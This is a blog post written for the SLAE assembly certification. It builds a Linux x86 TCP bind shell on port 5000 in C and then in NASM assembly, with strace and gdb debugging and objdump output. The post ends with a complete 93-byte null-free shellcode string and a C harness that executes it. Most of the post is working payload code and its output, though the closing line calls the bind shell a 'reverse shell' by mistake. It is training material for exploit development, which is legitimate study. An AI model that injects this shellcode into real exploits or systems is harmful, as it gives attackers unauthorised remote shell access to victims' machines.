---
title: SLAE Tcp Bind Shell
date: 2017-03-21
draft: false
---
# SLAE
The SecurityTube Linux Assembly Expert is a course and certification from the
folks over at http://www.securitytube-training.com and also available on
http://www.pentesteracademey.com.

This blog post is the first post required for the exam requirements. My student
id is: PA-4897 and the github url to my repo is https://github.com/mwest67/slae.

# Getting started
Our first task is to create a tcp bind shell in shellcode. In order to do this
lets first understand what a bind shell is. Simply put a bind shell listens for
a network connection on a particular port and when a connection is made it then
redirects the programs STDIN, STDOUT and STDERR to the new connection, it then
calls execve to replace the current process with a shell (usually /bin/sh). The
client is then free to interact with the shell

Right, now we know what we want to achieve lets get started first thing first
lets list all the syscalls we are going to need in order to achieve this task

* [socket][socket]  - This is needed to create the listening socket
* [bind] [bind]     - This is so we can tell the OS where to listen
* [listen] [listen] - This is required to start the socket listening for
                      connections
* [accept] [accept] - This is to accept incoming connections
* [dup2] [dup2]     - This is so we can redirect STDIN, OUT and ERR
* [execve] [execve] - This is so we can spawn the shell

# Initial Version
Before we break out the assembler, let make sure we are good with achieving this
in a higher level language like C

{{< highlight C >}}
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
        /* Initialize some variables */
        int sockfd = 0, clientfd = 0;

        /* Initialize the socket */
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        /* Set up the params for the server socket */
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        server_addr.sin_port = htons(5000); /* htons to convert to network byte order */

        /* Bind to the address we gave it */
        bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));

        /* tell the server to listen */
        listen(sockfd, 10);

        /*
         * We should now start accepting client connections
         * the NULLS are because we dont care who is connecting
         * if we did we would need a pointer to a fresh sockaddr_in
         * struct for the accept call to fill in
         */

        clientfd = accept(sockfd, (struct sockaddr*)NULL, NULL);

        /* Redirect STDIN(0), STDOUT(1) and STDERR(2) to the client socket */
        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);

        /* execute the shell */
        char* args[] = {"/bin/bash", NULL};
        execve(args[0], args, NULL);

}
{{< / highlight >}}

Lets compile and run
```
  $ gcc -m32 -o bind_shell bind_shell.c
  $ ./bind_shell

```
And now from another shell
```
  $ nc localhost 5000
  ls
  bind
  bind.o
  bind_shell
  bind_shell.c

```
Right so our C version is working, the code is pretty well commented but it is
clear that there is no error checking and also that there are LOTS of constants
that we wont have when we come to write this in assembly. These are

* syscall numbers (as C provides convenience functions for these)
* AF_INET - The protocol family
* SOCK_STREAM - Used for TCP connection
* INADDR_ANY - Used to tell OS to listen on all addresses

We also need to figure out how the sockaddr_in structure needs to look on the
stack 

# Information Gathering

## 1. Syscall Numbers
Lets gather all the syscall numbers. For this installed the libc6-dev-i386
package on my 64bit kali vm. This installs the linux headers into /usr/include.
This include file we are specifically interested in for the syscall numbers is 
/usr/include/asm/unistd_32.h a quick grep through this yields the following
syscall numbers

```
#define __NR_socket 359
#define __NR_bind 361
#define __NR_listen 363
#define __NR_accept4 364
#define __NR_dup2 63
#define __NR_execve 11
```
_Note: There is an x86 specific syscall called socketcall and is number 102
which a lot of people use when producing this type of shellcode but I have
decided to use the individual calls._

## Constants
Right, we now have all our syscall numbers time to gather all of our other
constants. Lets take a grep through the header files

```
  $ grep -r AF_INET /usr/include/**/*.h
/usr/include/bits/socket.h:#define AF_INET              PF_INET
/usr/include/bits/socket.h:#define AF_INET6     PF_INET6
/usr/include/linux/if_link.h: *       [AF_INET] = {
/usr/include/linux/if_link.h: *       [AF_INET6] = {
/usr/include/linux/in6.h: *     Types and definitions for AF_INET6
/usr/include/linux/in6.h:       unsigned short int      sin6_family;    /* AF_INET6 */
/usr/include/linux/l2tp.h:      __kernel_sa_family_t l2tp_family; /* AF_INET */
/usr/include/linux/l2tp.h:      __kernel_sa_family_t l2tp_family; /* AF_INET6 */
/usr/include/X11/Xdmcp.h:#if defined(IPv6) && defined(AF_INET6)

  $ grep -r PF_INET /usr/include/**/*.h
/usr/include/bits/socket.h:#define PF_INET              2       /* IP protocol family.  */
/usr/include/bits/socket.h:#define PF_INET6     10      /* IP version 6.  */
/usr/include/bits/socket.h:#define AF_INET              PF_INET
/usr/include/bits/socket.h:#define AF_INET6     PF_INET6

```
As you can see from above AF_INET is aliased to PF_INET so a quick search
reveals AF_INET = 2. If we continue grepping for the other constants we find
that SOCK_STREAM = 1 and INADDR_ANY = 0

# Syscalls from Assembly
Before we head off on this trip lets remind our selves of how syscalls happen
from assembly. Below is the order of business
- Put the syscall number in the eax register
- Setup the syscall params using EBX, ECX and EDX, syscalls with more params
  either use the stack or other registers sucj as ESI
- Call interupt 0x80 to trigger the call
- Results of the syscall gets returned in EAX

Lets also refresh ourselves on the desired characteristics of our shellcode
- Small as possible (this means being crafty with params etc)
- No bad chars such as NULL (meaning we want to use the appropriate registers)
- Port numbers need to be in Network byte order or Big Endian

# Lets Begin

First thing we going to need to do is zero out our registers so we have a clean
slate

{{< highlight nasm >}}
        xor eax, eax            ; Zero out registers
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
{{< / highlight >}}

With that out the way lets now take a look at the socket syscall docs (link
above)

```
  sockfd = socket(int socket_family, int socket_type, int protocol);
```
Right so the registers need to be as follows
- EAX: 359 for socket syscall (see above)
- EBX: 2 for AF_INET (1st param)
- ECX: 1 for SOCK_STREAM (2nd param)
- EDX: 0 for IP (3rd param which is already set via xor above)

If all goes well we should get a file descriptor to a sock back in EAX. Heres
the code

{{< highlight nasm >}}
        mov bl, 0x2             ; AF_INET
        inc cl                  ; SOCK_STREAM = 1 - Leave EDX 0 for IP
        mov ax, 0x0167          ; Socket syscall number
        int 0x80                ; make call
{{< / highlight >}}

Notice how we used the 8 bit versions of EBX and ECX to avoid NULLs and also how
we used "inc cl" to save a byte as apposed to a mov instruction. We used the 16
bit version of EAX to avoid NULL and because 0x167 in hex (359 dec) needs two
bytes.

So at this point we are assuming everything went ok (we are writing shellcode
and we cant spare the bytes for error checking) which means that there should be
a socket file descriptor sat in EAX waitning for us, the problem is we need EAX
for our next syscall so we shall have to save it somewhere! Lets use EDI

{{< highlight nasm >}}
        xchg edi, eax           ; store socketfd
{{< / highlight >}}

I used xchg here to save a byte and I chose EDI so I didnt have to reset ESI for
the accept4 call later (I will explain more on this later)

Now that is out of the way we need to set up the bind syscall, we have the
syscall number and the address familly constants all worked out for this but we
now need to figure out how the sockaddr_in structure looks on the stack. First
let us remind our selves how sockaddr_in looks in C
```
  struct sockaddr_in {  
    short sin_family;  
    unsigned short sin_port;  
    struct in_addr sin_addr;  
    char sin_zero[8];  
  };  
```
So we need sin\_family which if you remember the C version is just AF_INET then
we need the port which has to be in network byte order. We are using port 5000
which is 0x1388 in hex so network byte order would be 0x8813. The next parameter
is the IP address structure which contains the IP to bind to, since we are
binding to all IP's using INADDR_ANY which is 0 then this value can be zero.
Next is the interesting value which is the sin_zero field now according to the
documentation this field is "Padding to make structure the same size as
SOCKADDR" which means we dont need to bother setting it so our structure on the
stack will be
```
High Mem: 0x00000002   ; sin_family (AF_INET)
          0x8813       ; sin_port (Network Byte Order)
 Low Mem: 0x00000000   ; sin_addr (INADDR_ANY)
```
Remeber as this is the stack we have to push things on in reverse order. Lets
look at the bind call args again just to remind ourselves.
```
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
Ok so we need EBX to point to the server socket handle (currently in EDI), we
need a pointer to our sockaddr_in structure we put on the stack in ECX and then
we need the size of the structure in EDX which can be computed as 2 bytes for
AF_INET (short) 2 bytes for the port, 4 bytes for the long (inet address) then 8
bytes for the padding which adds up to 16 bytes or 0x10

So lets get this all set up

{{< highlight nasm >}}
        ; Now call bind
        push edx                ; INADDR_ANY - IP to bind to in soccaddr_in
        push word 0x8813        ; Port in Network byte order
        push word bx            ; Address Family AF_INET
        mov ecx, esp            ; get pointer to structure
        xchg ebx, edi           ; put server socket fd into ebx (use xchg to save a byte)
        mov dl, 0x10            ; set struct len
        mov ax, 0x0169          ; bind syscall
        int 0x80                ; make call
{{< / highlight >}}

Hopefully this makes sense first we have 3 pushes which set up our sockaddr_in
struct on the stack, third push pushes the EBX register which already contains
0x2 for AF_INET. Whe then move value of the stack pointer into ECX so we now
have a pointer to our structure. Next we use xchg to get the socket handle from
edi into EBX we then move the struct length of 16 bytes into EDX. Lastly we
setup the bind syscall and execute it.

Now we have to call the listen call. Listen has the following signature.
```
int listen(int sockfd, int backlog);
```
As EBX is already set to the server socket fd we only have to set ECX to a
sensible value as it currently a pointer to a sockaddr_in struct. We achieve
this by xchg ing ECX and EDX as EDX has the value 16 which is an acceptable
value for the backlog parameter.

{{< highlight nasm >}}
        ; Call listen
        xchg ecx, edx           ; set up the backlog parameter
        mov ax, 0x016B          ; set syscall number for listen
        int 0x80                ; make the call
{{< / highlight >}}

Time to move on, next up we want to call accept (or accept4 in our case). Lets
have a look at the signature for this call

```
int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
```
So breaking this down we want

- EBX to be the socket fd we are accepting connections from
- ECX to be a pointer to the struct that will get filled with the client address
- EDX to be the lenth of the structure
- ESI to be the flags setting 

In our code EBX is already set up, we dont care about the client address so ECX
and EDX can be 0x0 although I dont zero out EDX as it seems to be ignored when
ECX points nowhere. Now how did I find that ESI was used for the flags
parameter? I googled and could not find what I wanted and I was too lazy to go
digging in the kernel source. As it turns out when I coded the inital socket
call I originally used ESI to store the server socket fd in so when i did the
xchg with EBX to setup the call to bind this meant ESI now had the value 0x2.
When I had completed my code I found it failed on the accept call. I ran the
tool with a cool linux debugging tool called strace and below is the output

```
  $ strace ./bind
execve("./bind", ["./bind"], [/* 21 vars */]) = 0
strace: [ Process PID=2852 runs in 32 bit mode. ]
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(5000), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 16)                           = 0
accept4(3, NULL, 0xffb21478, 0x2 /* SOCK_??? */) = -1 EINVAL (Invalid argument)
```
This told me all my other parameters were correct I just needed find where the
flags parameter was being set so I turned to trusty old GDB


```
 $ gdb -q ./bind
Reading symbols from ./bind...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048060
(gdb) run
Starting program: /root/src/bind

Breakpoint 1, 0x08048060 in _start ()
(gdb) disassemble
Dump of assembler code for function _start:
=> 0x08048060 <+0>:     xor    %eax,%eax
   0x08048062 <+2>:     xor    %ebx,%ebx
   0x08048064 <+4>:     xor    %ecx,%ecx
   0x08048066 <+6>:     xor    %edx,%edx
   0x08048068 <+8>:     mov    $0x2,%bl
   0x0804806a <+10>:    inc    %cl
   0x0804806c <+12>:    mov    $0x167,%ax
   0x08048070 <+16>:    int    $0x80
   0x08048072 <+18>:    xchg   %eax,%esi
   0x08048073 <+19>:    push   %edx
   0x08048074 <+20>:    pushw  $0x8813
   0x08048078 <+24>:    push   %bx
   0x0804807a <+26>:    mov    %esp,%ecx
   0x0804807c <+28>:    xchg   %ebx,%esi
   0x0804807e <+30>:    mov    $0x10,%dl
   0x08048080 <+32>:    mov    $0x169,%ax
   0x08048084 <+36>:    int    $0x80
   0x08048086 <+38>:    xchg   %ecx,%edx
   0x08048088 <+40>:    mov    $0x16b,%ax
   0x0804808c <+44>:    int    $0x80
   0x0804808e <+46>:    xor    %ecx,%ecx
   0x08048090 <+48>:    mov    $0x16c,%ax
   0x08048094 <+52>:    int    $0x80
   0x08048096 <+54>:    xchg   %eax,%ebx
   0x08048097 <+55>:    mov    $0x2,%cl
End of assembler dump.
(gdb) break *0x08048094
Breakpoint 2 at 0x8048094
(gdb) c
Continuing.

Breakpoint 2, 0x08048094 in _start ()
(gdb) info registers
eax            0x16c    364
ecx            0x0      0
edx            0xffffd6f8       -10504
ebx            0x3      3
esp            0xffffd6f8       0xffffd6f8
ebp            0x0      0x0
esi            0x2      2
edi            0x0      0
eip            0x8048094        0x8048094 <_start+52>
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0
(gdb)
```
see the 0x2 in ESI? I set that to 0 and boom! my accept call was working
```
(gdb) set $esi = 0
(gdb) c
Continuing.

```
The program is now waiting for connections. I now can either xor ESI or use EDI to store the
server socket fd. I chose to use EDI instead however on second thoughts the
program this shellcode may be instered into may have already set ESI so its best
to xor it lets look at the code for the accept call

{{< highlight nasm >}}
        xor ecx, ecx            ; zero out registers
        xor esi, esi
        mov ax, 0x016c          ; set accept syscall
        int 0x80                ; make the call
        xchg ebx, eax           ; store the client socket fd in ebx so we can use for the dup call
{{< / highlight >}}

Notice how I use xchg to store the return value of accept (which is the client
socket fd) into EBX which will be the first parameter for the three dup2 calls
which have to come next

Right on to the dup2 calls, here we have to redirect our processes STDIN, STDOUT
and STDERR to the client socket which we shall achieve using dup2. Observant
reader might realize that STDIN, STDOUT and STDERR have the values 0, 1 & 2 and
calling dup2 sounds a lot like a job for a loop. So here what we shall do is set
the counter register (ECX) to 0x2 perform the dup2 call then decrement ECX if
the sign flag has not been set (ECX is stil >= 0) then we shall loop around
again calling the dup2 again. This should end up making the following dup 2
calls.

- dup2(4, 2)
- dup2(4, 1)
- dup2(4, 0)

These three calls will redirect our STDIN, STDOUT and STDERR to the client
socket. Here is the code

{{< highlight nasm >}}
        mov cl, 0x2
loop:
        mov al, 0x3f            ; setup dup2 call
        int 0x80                ; call dup2
        dec ecx                 ; decrement the loop counter
        jns loop                ; if the sign flag is not set then repeat the loop
{{< / highlight >}}

Last thing to do is to make the execve call and then were done. Lets look at the
execve signature
```
int execve(const char *filename, char *const argv[], char *const envp[]);
```
Here is how we want the registers to look

- EBX: pointer to the NULL terminated string "//bin/sh"
- ECX: pointer to an array containing the aruments to the program (includes
  //bin/sh string itself)
- EDX: NULL as we are not going to pass any environment to the shell

A couple of points to note for this are
1. Its easier to push strings if they are multiples of 4 in length which is why
we use //bin/sh as it is 8 characters in length and linux doesnt care about the
extra /
2. We have to push the string on the stack in reverse so we push hs/nib//

Here is the code 

{{< highlight nasm >}}
        push eax                ; push NULL onto stack to termins //bin/sh
        push 0x68732f6e         ; push //bin/sh in reverse onto the stack
        push 0x69622f2f         ; see above
        mov  ebx, esp           ; move address of //bin/sh into EBX (execve's 1st parameter)
        push eax                ; this serves two purposes 1, to use for EDX (we will pass no
                                ; environment to the shell and also as part of the array of
                                ; args that we will pass to as the 2nd arg of execve
        mov  edx, esp           ; see above
        push ebx                ; ESP now points to and array of args [address of //bin/sh, 0x00]
                                ; these will act as the args to //bin/sh
        mov ecx, esp            ; setup the 3rd argument
        mov al, 0x0b            ; set the EAX register to the execve sys call number
                                ; using al to remove any null bytes
        int 0x80                ; make the call
{{< / highlight >}}

Right all done! Below is the code in all its glory!!

{{< highlight nasm >}}
global _start
section .text

_start:
        xor eax, eax            ; Zero out registers
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
        xor edi, edi

        ; Setup Socket call
        mov bl, 0x2             ; AF_INET
        inc cl                  ; SOCK_STREAM = 1 - Leave EDX 0 for IP
        mov ax, 0x0167          ; Socket syscall number
        int 0x80                ; make call

        xchg edi, eax           ; store socketfd

        ; Now call bind
        push edx                ; INADDR_ANY - IP to bind to in soccaddr_in
        push word 0x8813        ; Port in Network byte order
        push word bx            ; Address Family AF_INET
        mov ecx, esp            ; get pointer to structure
        xchg ebx, edi           ; put server socket fd into ebx (use xchg to save a byte)
        mov dl, 0x10            ; set struct len
        mov ax, 0x0169          ; bind syscall
        int 0x80                ; make call

        ; Call listen
        xchg ecx, edx           ; set up the backlog parameter
        mov ax, 0x016B          ; set syscall number for listen
        int 0x80                ; make the call

        xor ecx, ecx            ; zero out registers
        mov ax, 0x016c          ; set accept syscall
        int 0x80                ; make the call
        xchg ebx, eax           ; store the client socket fd in ebx so we can use for the dup call

        mov cl, 0x2
loop:
        mov al, 0x3f            ; setup dup2 call
        int 0x80                ; call dup2
        dec ecx                 ; decrement the loop counter
        jns loop                ; if the sign flag is not set then repeat the loop
                                ; this will tie our stdin, out and error to the client socket

        xor  eax, eax
        push eax                ; push NULL onto stack to termins //bin/sh
        push 0x68732f6e         ; push //bin/sh in reverse onto the stack
        push 0x69622f2f         ; see above
        mov  ebx, esp           ; move address of //bin/sh into EBX (execve's 1st parameter)
        push eax                ; this serves two purposes 1, to use for EDX (we will pass no
                                ; environment to the shell and also as part of the array of
                                ; args that we will pass to as the 2nd arg of execve
        mov  edx, esp           ; see above
        push ebx                ; ESP now points to and array of args [address of //bin/sh, 0x00]
                                ; these will act as the args to //bin/sh
        mov ecx, esp            ; setup the 3rd argument
        mov al, 0x0b            ; set the EAX register to the execve sys call number
                                ; using al to remove any null bytes
        int 0x80                ; make the call
{{< / highlight >}}

Lets compile, link and run it
```
 $ nasm -f elf32 -o bind.o bind_shell.nasm
 $ ld -m elf_i386 -o bind bind.o
 $ ./bind

```
And now on another shell
```
  $ nc localhost 5000
ls
bind
bind.o
bind_shell
bind_shell.c
bind_shell.nasm

```
Woop woop, party time!! Well not quite we wanted shellcode not and assembly
program. Lets run this through objdump
```
  $ objdump -d bind.o

bind.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   31 db                   xor    %ebx,%ebx
   4:   31 c9                   xor    %ecx,%ecx
   6:   31 d2                   xor    %edx,%edx
   8:   31 ff                   xor    %edi,%edi
   a:   b3 02                   mov    $0x2,%bl
   c:   fe c1                   inc    %cl
   e:   66 b8 67 01             mov    $0x167,%ax
  12:   cd 80                   int    $0x80
  14:   97                      xchg   %eax,%edi
  15:   52                      push   %edx
  16:   66 68 13 88             pushw  $0x8813
  1a:   66 53                   push   %bx
  1c:   89 e1                   mov    %esp,%ecx
  1e:   87 df                   xchg   %ebx,%edi
  20:   b2 10                   mov    $0x10,%dl
  22:   66 b8 69 01             mov    $0x169,%ax
  26:   cd 80                   int    $0x80
  28:   87 ca                   xchg   %ecx,%edx
  2a:   66 b8 6b 01             mov    $0x16b,%ax
  2e:   cd 80                   int    $0x80
  30:   31 c9                   xor    %ecx,%ecx
  32:   31 f6                   xor    %esi,%esi
  34:   66 b8 6c 01             mov    $0x16c,%ax
  38:   cd 80                   int    $0x80
  3a:   93                      xchg   %eax,%ebx
  3b:   b1 02                   mov    $0x2,%cl

0000003d <loop>:
  3d:   b0 3f                   mov    $0x3f,%al
  3f:   cd 80                   int    $0x80
  41:   49                      dec    %ecx
  42:   79 f9                   jns    3d <loop>
  44:   31 c0                   xor    %eax,%eax
  46:   50                      push   %eax
  47:   68 6e 2f 73 68          push   $0x68732f6e
  4c:   68 2f 2f 62 69          push   $0x69622f2f
  51:   89 e3                   mov    %esp,%ebx
  53:   50                      push   %eax
  54:   89 e2                   mov    %esp,%edx
  56:   53                      push   %ebx
  57:   89 e1                   mov    %esp,%ecx
  59:   b0 0b                   mov    $0xb,%al
  5b:   cd 80                   int    $0x80

```
Great we appear to have avoided the dreaded NULL bytes!!. Lets get this into
shell code

```
  $ for i in $(objdump -d bind.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13
\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9
\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73
\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```
Lets put this into our shellcode test harness 

{{< highlight C >}}
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13"\
"\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9"\
"\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73"\
"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

          printf("Shellcode Length:  %d\n", strlen(code));

                  int (*ret)() = (int(*)())code;

                          ret();

}
{{< / highlight >}}

Lets run it
```
  $ gcc -o shell_test -fno-stack-protector -z execstack -m32 shell_test.c
  $ ./shell_test
Shellcode Length: 93

```
And now on another shell
```
  $ nc localhost 5000
ls
bind
bind.o
bind_shell
bind_shell.c
bind_shell.nasm
shell_test.c
shell_test

```
Great our reverse shell works and in 93 bytes which is not bad but I have found
shellcode on shell-storm which does this extact function in 89 bytes. I may work
on this to get it smaller but I think this is good enough for now.

Note: I had gotten this down to 87 bytes when running as a straight assembly
program however when running in the C skeleton a few things became apparent and
I needed to modify my code these were

1. I had to xor EDI as it was not 0x0 by the time my code go executed
2. I had to re xor eax in the execve code as this was not 0 by the time my code
got executed

Cheers and happy shellcoding!


[socket]: https://linux.die.net/man/7/socket  "Socket Man page docs"
[bind]: https://linux.die.net/man/7/bind  "Bind Man page docs"
[listen]: https://linux.die.net/man/7/listen  "listen Man page docs"
[bind]: https://linux.die.net/man/7/bind  "bind Man page docs"
[accept]: https://linux.die.net/man/7/accept  "accept Man page docs"
[dup2]: https://linux.die.net/man/7/dup2  "dup2 Man page docs"
[execve]: https://linux.die.net/man/7/execve  "execve Man page docs"
